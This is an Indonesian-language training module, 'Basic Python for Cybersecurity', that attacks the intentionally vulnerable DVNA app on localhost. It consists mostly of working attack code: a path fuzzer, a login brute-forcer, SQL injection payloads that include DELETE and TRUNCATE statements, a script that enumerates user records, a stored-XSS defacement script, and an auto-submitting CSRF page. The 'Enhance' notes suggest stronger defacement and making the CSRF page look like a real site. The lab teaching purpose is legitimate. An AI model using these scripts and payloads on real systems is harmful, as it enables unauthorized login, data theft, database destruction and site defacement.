# Website Recon & Exploit

*Basic Python for Cybersecurity*

*© 2025 Yogi Agnia Dwi Saputro dan PT. Cyberkarta Tugu Teknologi.*

Dilarang keras memperbanyak, menyalin, mendistribusikan, atau menggunakan sebagian atau seluruh isi karya ini dalam bentuk apapun tanpa izin tertulis dari pemegang hak cipta.

------------------------------------

## Praktik Website Recon & Exploit Umum

1. Path/directory fuzzing
2. Brute force web login
3. SQL injection
4. XSS exploit
5. CSRF exploit

### Setup Awal

- Instalasi Docker
  - Update apt: `sudo apt update`
  - Install Docker: `sudo apt install docker.io -y`
  - Cek instalasi Docker berhasil dengan lihat versinya: `docker -v`
  - Jalankan Docker daemon: `sudo systemctl enable docker --now`
  - Berikan permission ke user agar tidak selalu sudo: `sudo usermod -aG docker $USER`. Agar bisa bekerja, perlu logout dari komputer, lalu login kembali.

- Gunakan [DVNA](https://github.com/appsecco/dvna) sebagai website target
  - Jalankan DVNA via Docker: `docker run --name dvna -p 9090:9090 -d appsecco/dvna:sqlite`
  - Cek image sudah jalan via Docker: `docker ps`, seharusnya ada container dengan kata kunci `dnva`
  - Cek browser di URL `http://localhost:9090`

- Setup Virtual Environment
  - buat folder virtual environment: `python -m venv web_recon_exploit`
  - pindah ke folder virtual environment: `cd web_recon_exploit`
  - Aktifkan virtual environment: `source bin/activate`
  - Install library yang diperlukan
    - `requests` untuk jalankan HTTP request: `pip install requests`
    - `argparse` untuk parsing input dengan lebih mudah dibanding `sys.argv`: `pip install argparse`
    - `bs4` alias Beautiful Soup untuk parsing HTML: `pip install bs4`
  
### Path/Directory Fuzzing

#### Define
- **Input**: URL, file `wordlist.txt`, delay request (optional)
- **Output**: report URL yang bisa diakses
- **Process**: Cari URL/path yang dapat diakses public beradasarkan list

#### Refine
- parsing input args
- baca wordlist dari input
- Looping untuk tiap path
- kirim HTTP request untuk masing-masing path
- tampilkan URL jika path dapat diakses

#### Implement/Iterate

- Sebelum masuk ke dalam code, cek dulu web yang dijadikan target. Pastikan web dapat diakses. Dalam kasus DVNA, alamat web nya adalah `http://localhost:9090`.
- Gunakan referensi open source berikut sebagai sumber `wordlist.txt`: `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt`
- Setelah siap, mulai buat program Python.

```python
# path_fuzzing.py
import requests
import argparse
import time

def fuzz_paths(base_url, wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            paths = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Failed to read wordlist: {e}")
        return

    print(f"traversing {len(paths)} records...")
    for path in paths:
        url = base_url.rstrip('/') + '/' + path
        try:
            response = requests.get(url, timeout=5)
            if response.status_code < 400:
                print(f"[{response.status_code}] Found: {url}")
        except requests.RequestException:
            print(f"Request failed: {url}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Path-fuzzing Python program")
    parser.add_argument("--file", help="Path to file containing list of common keywords")
    parser.add_argument("--url", help="Base URL of target")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay in seconds between each request (default: 0.5)")
    args = parser.parse_args()

    fuzz_paths(args.url, args.file)
```

#### Validate
- Jalankan untuk berbagai skenario
  - 3 parameter lengkap: `python3 path_fuzzing.py --file wordlist.txt --url http://localhost:9090 --delay 1.5` --> ekspektasi: berhasil
  - tanpa file wordlist: `python3 path_fuzzing.py --url http://localhost:9090 --delay 1.5` --> ekspektasi: gagal
  - tanpa URL: `python3 brute_login.py --file wordlist.txt --delay 2.5` --> ekspektasi: gagal
  - tanpa delay: `python3 brute_login.py --file wordlist.txt --url http://localhost:9090` --> ekspektasi: berhasil

#### Enhance
- Tambahkan log hasil fuzzing, dipisah berdasarkan berhasil/gagal akses
- Lengkapi error handling
- Buat progress bar ketika looping

### Brute Force Web Login

#### Define
- **Input**: URL, file `credentials.txt`, delay between requests (optional)
- **Output**: report login
- **Process**: analisis field login, gunakan HTTP request untuk login dengan input credential

#### Refine
- parsing input args
- baca credential dari input
- kirim HTTP request berdasarkan credential
- parsing response server

#### Implement/Iterate

- Sebelum masuk ke dalam code, cek dulu web yang dijadikan target
- Dalam case DVNA, buat dahulu akun baru. Di dokumen ini pakai `username:tester` dan `password:tester`
- Pantau form login, catat field yang dipakai berdasarkan atribut `name` dalam tag `<input>`
```html
<form id="login" name="login" action="/login" method="post">
    <fieldset>

        <div class="form-group ">
            <label class="  control-label" for="login_login">Login </label>
            <div class="  controls">

                <input type="text" name="username" value="" id="login_login" class="form-control" placeholder="Enter login">
            </div>
        </div>

        <div class="form-group ">
            <label class="  control-label" for="login_password">Password </label>
            <div class="  controls">

                <input type="password" name="password" id="login_password" class="form-control" placeholder="Enter password">
            </div>
        </div>


        <input type="submit" value="Submit" id="login_0" class="btn btn-primary">

    </fieldset>
</form>
```
- Dalam kasus DVNA, atribut yang dipakai adalah `{username, password}`
- Test dengan curl, catat jenis response dari server: HTTP status code, redirect, dll
```bash
curl -X POST http://localhost:9090/login -H "Content-Type: application/x-www-form-urlencoded" -d "username=guest&password=123456"
```
- Dalam kasus DVNA, hasilnya adalah redirect ke `/learn`, sehingga logika program perlu disesuaikan
- Setelah fix, baru buat program python

```python
import requests
import argparse
import time
import sys

def load_credentials(file_path):
    credentials = []
    with open(file_path, 'r') as file:
        for line in file:
            if ':' in line:
                username, password = line.strip().split(':', 1)
                credentials.append((username, password))
    return credentials

def brute_force_login(url, credentials):
    for username, password in credentials:
        # field username & password dilihat dari HTML web (cek pakai inspect element)
        # Nama field tidak selalu standar, cek dulu sebelum tulis di program
        data = {
            "username": username,
            "password": password
        }
        try:
            response = requests.post(url, data=data)
            # response server bisa berupa redirect atau HTTP status code.
            # cek dahulu dengan curl behavior server
            if response.url.endswith("/learn"):
                print(f"✅ Login success: {username}:{password}")
                sys.exit(0) # langsung exit setelah ditemukan credential yang berhasil
            else:
                print(f"❌ Failed: {username}:{password}")

        except Exception as e:
            print(f"⚠️ Error with {username}:{password} → {e}")
        time.sleep(args.delay)    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force a login form via HTTP POST")
    parser.add_argument("--credentials", help="Path to credential file (username:password)")
    parser.add_argument("--url", help="Target login URL (e.g., http://localhost:8000/login)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay in seconds between each request (default: 1)")
    args = parser.parse_args()

    creds = load_credentials(args.credentials)
    brute_force_login(args.url, creds)
```

#### Validate
- Jalankan untuk berbagai skenario
  - 3 parameter lengkap: `python3 brute_login.py --credentials credentials.txt --url http://localhost:9090/login --delay 1.5`
  - tanpa credentials: `python3 brute_login.py --url http://localhost:9090/login --delay 2.5` --> ekspektasi: gagal
  - tanpa URL: `python3 brute_login.py --credentials credentials.txt --delay 2.5` --> ekspektasi: gagal
  - tanpa delay: `python3 brute_login.py --credentials credentials.txt --url http://localhost:9090/login` --> ekspektasi: berhasil
  - Gunakan referensi open source untuk list `credentials.txt` yang lebih lengkap (cek bagian Referensi di bawah).

#### Enhance
- Tambahkan log hasil brute force
- Lengkapi error handling
- Keluar program jika menemukan credential yang berhasil login
- Pasang counter ketika proses brute force. ada berapa credential yang dicoba, berapa yang berhasil/gagal. Hal ini akan bermanfaat dalam beberapa kasus:
  - Ada rate limit / block sementara, sehingga saat muncul response HTTP status code `403` atau `429` berturut-turut proses brute force bisa dihentikan.
  - Ingin membuat progress bar

### SQL injection

#### Define
- **Input**: URL path endpoint yang vulnerable
- **Output**: hasil query SQL injection
- **Process**: Tentukan URL path, buat payload yang mengandung SQL query

#### Refine
- masukkan payload SQL injection
- kirim via HTTP request

#### Implement/Iterate

- Sebelum masuk ke dalam code, cek dulu web yang dijadikan target. Pastikan web dapat diakses. Dalam kasus DVNA, alamat web nya adalah `http://localhost:9090`.
- Identifikasi endpoint yang akan ditargetkan beserta request header dan request body. Asalnya dapat dari cek form login atau cek HTTP request di browser console lalu copy POST data
- Dalam kasus DVNA, endpoint yang memiliki celah adalah `http://localhost:9090/app/usersearch` dengan payload `login`
- Eksplorasi skenario untuk input yang mungkin bisa dieksploitasi, jalankan di browser (`http://localhost:9090/app/usersearch`):
  - Ambil semua data user: `' OR 1=1 --`
  - Re-check dengan ubah ordering: `' OR 1=1 ORDER BY id DESC --`
  - Masukkan data user baru: `' OR 1=1; INSERT INTO Users (name, email) VALUES ("injectiontest","injectiontest@mail.me"); --`, lalu cek dengan `' OR 1=1 ORDER BY id DESC --`
  - Update data user: pilih data lalu masukkan payload `' OR 1=1; UPDATE Users SET name = 'updated_guys' WHERE id = 1; --` lalu cek dengan `' OR 1=1 --`
  - Hapus data user: `' OR 1=1; DELETE FROM Users WHERE id = 1; --` lalu cek dengan `' OR 1=1 --`
  - Bersihkan tabel: `' OR 1=1; TRUNCATE TABLE Users; --`
- Dalam kasus DVNA, berikut temuannya
  - Query `SELECT` dapat dimanipulasi
  - Tidak bisa jalankan multiple query
  - Meskpiun dapat dilakukan `SELECT` untuk semua data, yang ditampilkan dalam response hanya data pertama.
- Analisis eksploitasi
  - id menggunakan integer --> bisa di looping
  - dapat manipulasi query `SELECT` berdasarkan id: `' OR id = 1`
  - dapat dilakukan ekstraksi data user dengan looping request berulang, perlu step tambahan untuk parsing HTML.
- Buat program untuk jalankan eksploitasi. 

```python
# sql_injection.py
import requests
import argparse
from bs4 import BeautifulSoup
import logging

# tambahkan logging, sangat membantu untuk cek request-response
logging.basicConfig(level=logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.DEBUG)

# Fungsi parse_html ini unik untuk masing-masing website, bahkan endpoint. Beda endpoint, bisa beda fungsi
def parse_html(response_text):
    soup = BeautifulSoup(response_text, "html.parser")
    
    table = soup.find("table", class_="table")
    if not table:
        print("No result table found.")
        return
    
    rows = table.find_all("tr")
    results = {}

    for row in rows:
        columns = row.find_all("td")
        header = row.find("th")
        if header and columns:
            results[header.text.strip().lower()] = columns[0].text.strip().lower()

    return results

def exploit_get_user_data(base_url, cookie_str):
    users = []
    try:
        # info headers diambil dari curl
        # info curl diambil dari browser --> inspect element --> network
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://localhost:9090',
            'Referer': base_url,
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i'
        }
        parsed_cookies = dict(x.split('=') for x in cookie_str.split('; '))
        
        payload_get_last_user = {"login": "\' OR 1=1 ORDER BY id DESC --"}
        response_last_user = requests.post(base_url, headers=headers,cookies=parsed_cookies, data=payload_get_last_user)

        if (response_last_user.status_code != 200):
            print("invalid request")
            return
        last_user = parse_html(response_last_user.text)
        if (last_user is None):
            print("cannot get data of last user")
            return
        users.append(last_user)

        for user_id in range(1,int(last_user['id'])):
            payload_get_user = {"login": f"\' OR id={user_id} --"}
            response = requests.post(base_url, headers=headers, cookies=parsed_cookies, data=payload_get_user)
            if response.status_code != 200:
                print(f"invalid request: user ID {user_id}")
            extracted_user = parse_html(response.text)
            users.append(extracted_user)

    except requests.RequestException:
        print(f"Request failed: {base_url}")

    return users

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL injection Python program")
    parser.add_argument("--url", help="Endpoint URL of target")
    parser.add_argument("--cookie", help="Cookie string")
    args = parser.parse_args()

    leaked_users = exploit_get_user_data(args.url, args.cookie)
    print(leaked_users)
```

#### Validate
- Jalankan untuk berbagai skenario
  - parameter lengkap: `python3 sql_injection.py --url http://localhost:9090/app/usersearch --cookie connect.sid=s%3A3XESvCZcNUiMK6cFsH5zGdKaMiW48aRs.HiSUlqUWMtQFDlpMpUt3lvm426bRtu7adP9%2BoHKSCvM` --> ekspektasi: berhasil
  - tanpa cookie: `python3 sql_injection.py --url http://localhost:9090/app/usersearch` --> ekspektasi: program jalan tapi tidak mendapat info user
  - tanpa URL: `python3 brute_login.py --file wordlist.txt --delay 2.5` --> ekspektasi: gagal

#### Enhance
- simpan output data user dalam log
- eksplorasi SQL query yang memungkinkan untuk ambil semua kolom data user
- Handling untuk mengatasi potensi banned atau rate limit dari server

### XSS Exploit

#### Define
- **Input**: URL path endpoint yang vulnerable, payload 
- **Output**: perubahan tampilan website
- **Process**: Masukkan payload perubahan website pada URL yang vulnerable

#### Refine
- Tentukan URL yang vulnerable
- Tentukan HTTP request untuk deface
- Kirim HTTP request ke server
- Cek response

#### Implement/Iterate

- Sebelum masuk ke dalam code, cek dulu web yang dijadikan target. Pastikan web dapat diakses. Dalam kasus DVNA, alamat web nya adalah `http://localhost:9090`.
- Cek dulu path/URL yang vulnerable, lakukan testing dengan masukkan XSS payload di web.
- Ambil credential seperti token/cookies untuk dipakai script Python.
- Setelah siap, mulai buat program Python.

```python
# xss_attack.py
import requests
from urllib.parse import quote

# Target URL diketahui dari inspect element --> Network
TARGET_URL = "http://localhost:9090/app/modifyproduct"

# code yang disisipkan ke dalam server
XSS_PAYLOAD = """
<script>
  document.body.style.backgroundColor = 'hotpink';
  let msg = document.createElement('div');
  msg.innerText = '⛔ Your website is not secured ⛔ @nonYmous';
  msg.style.position = 'fixed';
  msg.style.top = '20px';
  msg.style.left = '20px';
  msg.style.padding = '10px';
  msg.style.backgroundColor = 'black';
  msg.style.color = 'white';
  msg.style.fontSize = '20px';
  msg.style.zIndex = 9999;
  document.body.appendChild(msg);
</script>
"""

# Encode payload agar aman via URL
encoded_payload = quote(XSS_PAYLOAD)

# Untuk case DVNA, berikut adalah payload POST app/modifyproduct
# Cara mengetahuinya dengan inspect element --> cek Network
data = {
    "id":1,
    "name": XSS_PAYLOAD,
    "code": "222",
    "tags": "tag",
    "description": "yes",
}

# Cookie perlu di supply dari user. Ganti cookie di bawah dengan yang didapat dari browsermu.
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "XSS--Agent",
    "Cookie": "caonnect.sid=s%3A7HHg5aKYP7WNJYY_GazcmHRCxHQZs0F9.5FcFsMy%2FLqKAZvRVTCYNwK7PgTE6hP%2FjlhOtixJ3dLE",
}

print(f"Sending XSS payload to {TARGET_URL}")
response = requests.post(TARGET_URL, data=data, headers=headers)

# Check response
if response.status_code == 200:
    print("Payload sent. Refresh your browser.")
else:
    print(f"Failed to send payload. Status: {response.status_code}")
```

#### Validate
- Jalankan dengan cookies
- Jalankan tanpa cookies

#### Enhance
- Tambah mekanisme untu terima cookies sebagai input program.
- Coba payload lain yang memberikan efek lebih besar. Misal website deface.

### CSRF Exploit

#### Define
- **Input**: web server baru, perintah hit server
- **Output**: penambahan user via web UI lain
- **Process**: Buat web server yang melakukan request, kemudian request dikirim ke DVNA agar data di DVNA bertambah

#### Refine
- Buat HTML baru yang isinya melakukan request untuk tambah data
- Buat web server yang memnjalankan HTML tersebut.
- Buat agar request dilakukan ke back-end DVNA
- Jika user punya session login, maka data baru akan masuk.

#### Implement/Iterate

- Sebelum masuk ke dalam code, cek dulu web yang dijadikan target. Pastikan web dapat diakses. Dalam kasus DVNA, alamat web nya adalah `http://localhost:9090`.
- Cek URL path yang akan digunakan sebagai target. Dalam kasus DVNA, targetnya adalah `http://localhost:9090/app/modifyproduct`.
- Setelah siap, mulai buat program Python.

```html
<!-- csrf_exploit.html -->
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:9090/app/modifyproduct" method="POST">
      <input disabled name="id" value="2" />  
      <input disabled name="name" value="CSRF Product" />
      <input disabled name="code" value="csrfed" />
      <input disabled name="tags" value="hacked" />
      <input disabled name="description" value="This product is authorized. just kidding :p" />
    </form>
    <p>If the victim is logged in, this auto-submitted to back-end</p>
  </body>
</html>
```

- Jalankan web server dengan Python. Untuk case ini jalankan di port `9098` agar mirip port `9090` dari DVNA. 
```bash
python3 -m http.server 9098
```

- Cek before: `http://localhost:9090/app/products`
- Akses path via web browser ke `http://localhost:9098/csrf_exploit.html`
- Cek after: `http://localhost:9090/app/products`. Jika datanya bertambah, berarti serangan CSRF sukses.

#### Validate
- Cek kondisi DVNA sebelum serangan CSRF: `http://localhost:9090/app/products`
- Cek kondisi DVNA setelah serangan CSRF: `http://localhost:9090/app/products`


#### Enhance
- Buat HTML yang lebih mirip agar bisa dikira website asli
- Simpan log request sebelum kirim ke back-end DVNA


## Referensi
- Install Docker on Kali: https://www.kali.org/docs/containers/installing-docker-on-kali/
- DVNA Github: https://github.com/appsecco/dvna
- Referensi list fuzzing, credential, payload: https://github.com/danielmiessler/SecLists
- Referensi syntax SQL: https://www.w3schools.com/sql/sql_syntax.asp
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- 
